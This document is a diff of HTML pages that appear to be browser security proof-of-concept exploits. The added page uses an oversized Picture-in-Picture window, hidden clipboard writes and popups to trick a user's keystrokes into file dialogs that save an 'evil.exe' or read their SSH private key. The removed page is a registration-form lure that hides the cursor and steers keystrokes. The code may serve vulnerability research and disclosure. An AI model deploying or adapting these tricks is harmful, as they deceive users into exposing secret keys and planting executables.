@@ -1,87 +1,68 @@
-<html lang="en"><head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="Payment Handler API Example">
+<button onclick="start()">Click here</button>
+<input id="upload" type="file" style="display:none" onchange="loadFile(this.files[0])">
 
-    <title>Welcome to Payment Handler API Example!</title>
+<pre id="contents"></pre>
 
-    <link id="favicon" rel="icon" href="https://glitch.com/edit/favicon-app.ico" type="image/x-icon">
-    <link rel="stylesheet" href="/style.css">
-  </head>
-  <body style="cursor: none;">
-    <permission onclick="registerBtn.click();document.getElementById('reg_email').focus();"  value="aaa" id="vc" autofocus="" style="display: inline;width:100px;margin-left:30%" type="camera"></permission><div style="margin-top:17px;margin-left:40%">
+<script>
+const fileWritePath = "%userprofile%\\\\evil.exe";
+const fileReadPath = "%userprofile%\\\\.ssh\\\\id_rsa";
 
-<div class="panel-body" style="opacity:1;margin-top:100px">
-          
-              <div class="form-group mb15">
-                <input onchange="getemail()" onclick="w()" autofocus="" type="email" name="reg_email" id="reg_email" class="form-control" placeholder="Email Anda" fdprocessedid="7nyfw">
-              </div>
-              <div class="form-group mb15">
-                <input onchange="getnama()" type="text" id="reg_nama" name="reg_nama" class="form-control" placeholder="Nama Lengkap Anda" fdprocessedid="cd6u56">
-              </div>
-              <div class="form-group mb15">
-                <input onchange="steal()" type="text" id="reg_nohp" name="reg_nohp" class="form-control" placeholder="Nomor Handphone Anda" fdprocessedid="jcbhau">
-              </div>
-              <div class="form-group mb15">
-                <input type="password" id="reg_pwd" name="reg_pwd" class="form-control" placeholder="Password Anda" fdprocessedid="8aa04v">
-              </div>
-              <div class="form-group mb15">
-                <input type="password" id="reg_pwd_confirm" name="reg_pwd_confirm" class="form-control" placeholder="Konfirmasi Password Anda" fdprocessedid="cnp5l">
-              </div>
-             
-        
-            
-          </div>
+async function loadFile(file) {
+  window.moveTo(0, 0);
+  window.resizeTo(500, 500);
+  alert(`Read ${fileReadPath}:\n` + await (new Response(file)).text());
+}
 
+const pipOpen = async () => {
+  pipWindow = await documentPictureInPicture.requestWindow({
+    width: Math.pow(2,32),
+    height: Math.pow(2,32),
+  });
+  pipWindow.document.body.innerHTML = `
+  <button onclick="read=false;eval(document.querySelector('script').innerText)">Start file writing game!</button><br>
+  <button onclick="read=true;eval(document.querySelector('script').innerText)">Start file reading game!</button>
+  <script>
+  copyToClipboard(read ? "${fileReadPath}" : "${fileWritePath}");
+  const popup = window.open("${document.location.href}", read ? "popup-read" : "popup-write", "popup");
+  popup.resizeTo(200,200);
+  popup.moveTo(window.screenLeft + 30,window.screenTop + 30);
 
-<div><h1>Press Enter, Down and enter</h1></div>
+  setTimeout(()=>
+    document.body.innerHTML = "<p>Press " + (read ? "enter, then " : "") + "ctrl+v and enter to win this game!</p>",
+    400
+  );
 
-<div style="margin-top: -200px">
+  function copyToClipboard(text) {
+    const textarea = document.createElement("textarea");
+    textarea.style.opacity = "0%";
+    textarea.textContent = text;
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand("copy");
+  }
 
-</div>
-<div style="margin-top: 80px"></div>
-  
- <script>
-document.body.style.cursor = 'none'
-
- 
-
- var io=0;
-   var lk;
- document.onkeydown = function(e) {
-    switch (e.keyCode) {
-      
-      
-        else{clearInterval(lk)}
-        
-         document.getElementById('reg_email').focus();
-          i++;
-          break;
-    }
+  <${'/'}script>
+  `;
 };
 
-function myFunction() {
-  document.getElementById("demo").innerHTML = "Hello World";
+function download(data, filename, type) {
+  const file = new Blob([data], {type: type});
+  const a = document.createElement("a");
+  const url = window.URL.createObjectURL(file);
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
 }
- 
-    var nama=""
-   var email=""
-   var nohp=""
-   function getnama(){
-        nama=document.getElementById('reg_nama').value;
-    
-       
-   }
-   function getemail(){
-      email=document.getElementById('reg_email').value;
-   }
 
-  </script>  
-   </div>
-    <button id="register">
-     
-    </button>
-    <script src="index6.js"></script>
-  
-</body></html>
+function start() {
+  pipOpen();
+}
+
+if (window.name == "popup-write") {
+  download("This is an evil executable", "harmless");
+  document.body.onfocus = () => setTimeout(() => window.close(), 1000);
+} else if (window.name == "popup-read") {
+  document.body.onkeydown = () => document.getElementById("upload").click();
+}
+</script>
